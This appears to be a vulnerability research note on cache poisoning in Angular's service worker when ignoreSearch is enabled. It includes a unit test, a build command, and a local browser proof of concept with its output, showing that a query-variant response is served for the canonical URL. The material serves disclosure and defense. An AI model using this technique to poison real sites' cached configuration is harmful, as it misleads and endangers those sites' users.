# Angular Service Worker `ignoreSearch` Query Cache Probe

Date: 2026-04-28

## Framework unit probe

Temporary test added to `packages/service-worker/worker/test/prefetch_spec.ts`:

```ts
it('allows an unhashed query variant to populate an ignoreSearch asset cache entry', async () => {
  const dynamicScope = new SwTestHarnessBuilder().build();
  dynamicScope.fetch = async (req: RequestInfo) => {
    const url = typeof req === 'string' ? req : req.url;
    return dynamicScope.newResponse(url.includes('?attacker') ? 'attacker-config' : 'clean-config', {
      headers: {'Cache-Control': 'max-age=3600'},
    });
  };

  const dynamicManifest: Manifest = {
    configVersion: 1,
    timestamp: 1234567890123,
    index: '/index.html',
    assetGroups: [
      {
        name: 'dynamic',
        installMode: 'lazy',
        updateMode: 'lazy',
        urls: [],
        patterns: ['\\/runtime-config\\.json'],
        cacheQueryOptions: {ignoreSearch: true, ignoreVary: true},
      },
    ],
    navigationUrls: [],
    navigationRequestStrategy: 'performance',
    hashTable: {},
  };

  const dynamicGroup = new LazyAssetGroup(
    dynamicScope,
    dynamicScope,
    idle,
    dynamicManifest.assetGroups![0],
    new Map(),
    new CacheDatabase(dynamicScope),
    'test-dynamic',
  );

  const poisoned = await dynamicGroup.handleFetch(
    dynamicScope.newRequest('/runtime-config.json?attacker'),
    testEvent,
  );
  expect(await poisoned!.text()).toEqual('attacker-config');

  const canonical = await dynamicGroup.handleFetch(
    dynamicScope.newRequest('/runtime-config.json'),
    testEvent,
  );
  expect(await canonical!.text()).toEqual('attacker-config');
});
```

Command:

```bash
orb -m ubuntu -u root chroot --userspec=carlosgomez:carlosgomez /mnt/machines/angularvm /usr/bin/env HOME=/home/carlosgomez USER=carlosgomez LOGNAME=carlosgomez PATH=/usr/local/bin:/usr/bin:/bin:/opt/node-v22.22.2/bin pnpm --dir /home/carlosgomez/angular exec bazelisk test //packages/service-worker/worker/test:test --test_filter='prefetch assets allows an unhashed query variant to populate an ignoreSearch asset cache entry'
```

Result:

```text
//packages/service-worker/worker/test:test PASSED in 1.7s
Executed 1 out of 1 test: 1 test passes.
```

## Browser probe

PoC:

```text
bugs/angular/a9-sw-ignoresearch-query-cache-poisoning/poc/sw_ignoresearch_browser_probe.js
```

The PoC serves the Bazel-built Angular `ngsw-worker.js` with this manifest shape:

```json
{
  "assetGroups": [
    {
      "name": "dynamic",
      "installMode": "lazy",
      "updateMode": "lazy",
      "urls": [],
      "patterns": ["\\/runtime-config\\.json"],
      "cacheQueryOptions": {"ignoreSearch": true, "ignoreVary": true}
    }
  ],
  "hashTable": {}
}
```

It then loads a controlled page and performs:

1. `fetch('/runtime-config.json?attacker')` -> server returns `attacker-config`.
2. `fetch('/runtime-config.json')` -> no network hit; Angular SW serves the query variant from cache.

Observed output:

```json
{
  "first": "attacker-config",
  "second": "attacker-config",
  "hitCountAfterFirst": 1,
  "cachesAfterFirst": {
    "ngsw:/:db:control": [
      "http://127.0.0.1:8133/manifests",
      "http://127.0.0.1:8133/assignments",
      "http://127.0.0.1:8133/latest"
    ],
    "ngsw:/:a451d2f9b8c4187d0872da65fc4dabc222a4c844:assets:dynamic:cache": [
      "http://127.0.0.1:8133/runtime-config.json?attacker"
    ],
    "ngsw:/:db:a451d2f9b8c4187d0872da65fc4dabc222a4c844:assets:dynamic:meta": [
      "http://127.0.0.1:8133/http://127.0.0.1:8133/runtime-config.json?attacker"
    ]
  },
  "ngswState": "Driver state: NORMAL ((nominal))",
  "runtimeHits": [
    "/runtime-config.json?attacker"
  ],
  "controlled": true
}
```

## Relevant source paths

- `packages/service-worker/worker/src/adapter.ts:84-88`: `normalizeUrl()` drops `search` for same-origin URLs.
- `packages/service-worker/worker/src/assets.ts:121-126`: asset routing uses the normalized query-stripped URL for URL/pattern membership.
- `packages/service-worker/worker/src/assets.ts:141`: cache lookup uses the original `Request` plus `cacheQueryOptions`.
- `packages/service-worker/worker/src/assets.ts:335-344`: successful unhashed responses are cached under the original request URL and metadata key.
- `packages/service-worker/config/test/generator_spec.ts:437-512`: `cacheQueryOptions.ignoreSearch` is a public/generated config option.
